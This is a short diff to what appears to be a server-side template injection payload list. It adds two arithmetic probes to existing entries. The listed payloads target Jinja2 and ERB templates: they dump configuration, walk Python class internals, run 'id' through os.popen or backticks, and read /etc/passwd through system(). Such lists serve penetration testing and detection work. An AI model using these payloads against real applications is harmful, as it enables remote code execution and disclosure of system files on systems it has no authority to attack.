@@ -1,11 +1,13 @@
 {{7*7}}
 {{7*'7'}}
+${7*7}}
 {{config.items()}}
 {{''.__class__.__mro__[1].__subclasses__()}}
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
 {{request['application']['__globals__']['os']['popen']('id')['read']()}}
 <%= 7*7 %>
+<%=7*7%>
 <%=`id`%>
 <%25%3d+7*7+%25>
 <%= system('cat /etc/passwd') %>
